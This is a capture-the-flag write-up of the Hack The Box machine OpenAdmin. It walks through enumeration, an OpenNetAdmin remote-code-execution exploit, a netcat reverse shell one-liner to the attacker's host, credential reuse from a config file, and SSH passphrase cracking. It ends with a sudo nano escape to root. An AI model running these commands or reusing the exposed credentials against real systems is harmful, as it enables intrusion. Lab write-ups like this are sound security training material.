# HTB - OpenAdmin

#### Ip: 10.10.10.171
#### Name: OpenAdmin
#### Rating: Easy

----------------------------------------------------------------------

OpenAdmin.png

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/OpenAdmin]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV  10.10.10.171   
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-07 11:38 CDT
Nmap scan report for 10.10.10.171
Host is up (0.066s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b98df85d17ef03dda48cdbc9200b754 (RSA)
|   256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA)
|_  256 dcadca3c11315b6fe6a489347c9be550 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.68 seconds
```

Looking at port 80 we find an Apache landing page:

openadmin_apache.png

Kicking off some directory fuzzing we find several pages:

openadmin_dirs.png

Looking at the `/music` page we find a site that has a couple of links.

openadmin_music.png

And interestingly clicking on the "Login" button redirects us to a `/ona` page, running OpenNetAdmin.

openadmin_ona.png

Searching for opennetadmin exploits I find: https://github.com/amriunix/ona-rce

We can use the exploit to see if the target is vulnerable:

```
┌──(ryan㉿kali)-[~/HTB/OpenAdmin]
└─$ python ona-rce.py check http://10.10.10.171/ona 
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] The remote host is vulnerable!
```

Nice, lets exploit this.

### Exploitation

openadmin_pseudo.png

Lets issue a reverse shell one-liner to catch a proper shell back:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.30 443 >/tmp/f
```

And catch a shell back in netcat:

```
┌──(ryan㉿kali)-[~/HTB/OpenAdmin]
└─$ nc -lnvp 443                      
listening on [any] 443 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.171] 60348
bash: cannot set terminal process group (1280): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ hostname
hostname
openadmin
```

Trying to access the user.txt flag in the `/home` directory, we get a Permission Denied error try to access Jimmy and Joanna's folders.

```
www-data@openadmin:/opt/ona/www$ cd /home
www-data@openadmin:/home$ ls
jimmy  joanna
www-data@openadmin:/home$ cd jimmy
bash: cd: jimmy: Permission denied
www-data@openadmin:/home$ cd joanna
bash: cd: joanna: Permission denied
```

Browsing around the box I evetually find som DB credentials in `/opt/ona/www/local/config/database_settings.inc.php`

```
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
```

Using the credentials to login to the DB didn't yield much, but I was able to use the password to `su jimmy`

```
?>www-data@openadmin:/var/www/html/ona/local/config$ su joanna
Password: 
su: Authentication failure
www-data@openadmin:/var/www/html/ona/local/config$ su jimmy
Password: 
jimmy@openadmin:/opt/ona/www/local/config$ whoami
jimmy
```

Now that I have a shell as user jimmy, I can access the `/var/www/internal` folder, which i was unable to access as user www-data.

Looking through the folder reveals some interesting files:

index.php show a hash for Jimmy:

openadmin_jimmy_hash.png

Which I can crack in crackstation:

openadmin_crackstation

and main.php is also interesting:

```
jimmy@openadmin:/var/www/internal$ cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

So it looks like there is an internal page running, and accessing it likely will give me the id_rsa for user joanna.

Loading linpeas to help enumerate, we can confirm there is an internal.openadmin.htb page running on port 52846

openadmin_ports.png

openadmin_internal_host.png

Lets load Chisel to the target to set up a tunnel so we can access it.

On kali:
```
./chisel_1.8.1_linux_arm64 server -p 8000 --reverse
```

On the target:
```
./chisel_1.8.1_linux_amd64 client 10.10.14.30:8000 R:52846:127.0.0.1:52846
```

Once setup, we can access the internal page at 127.0.0.1:52846 and see the login page:

openadmin_internal_logon.png

and we can login with jimmy:Revealed

openadmin_id_rsa.png

We can copy the id_rsa and chaneg modes on it, but when going to use it we see it is passphrase protected.

```
┌──(ryan㉿kali)-[~/HTB/OpenAdmin]
└─$ chmod 600 joanna_id_rsa 
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/OpenAdmin]
└─$ ssh -i joanna_id_rsa joanna@10.10.10.171
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
ED25519 key fingerprint is SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.171' (ED25519) to the list of known hosts.
Enter passphrase for key 'joanna_id_rsa': 
```

Lets use ssh2john and JTR to try and crack the passphrase.

openadmin_john.png

Nice, we were able to crack it: bloodninjas

We can then SSH in as user Joanna:

```
┌──(ryan㉿kali)-[~/HTB/OpenAdmin]
└─$ ssh -i joanna_id_rsa joanna@10.10.10.171                   
Enter passphrase for key 'joanna_id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
```

And grab the user.txt flag:

openadmin_user_flag.png

### Privilege Escalation

Running `sudo -l` to see what joanna can run with elevated permissions, we find:

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Interesting. Priv appears to be an empty file, but is owned by root:

```
joanna@openadmin:/opt$ file priv
priv: empty
joanna@openadmin:/opt$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Jan  4  2020 .
drwxr-xr-x 24 root     root     4096 Aug 17  2021 ..
drwxr-x---  7 www-data www-data 4096 Nov 21  2019 ona
-rw-r--r--  1 root     root        0 Nov 22  2019 priv
```

Lets head over to GTFOBins and grab the command we'll need to exploit this.

openadmin_gtfobins.png

We can then run: `/bin/nano /opt/priv` then press control+r and control+x to enter a command, and finaly run `reset; sh 1>&0 2>&0` and we will drop into a root shell.

We can now grab the final flag:

openadmin_root.png

Thanks for following along!

-Ryan

--------------------------------------------------------------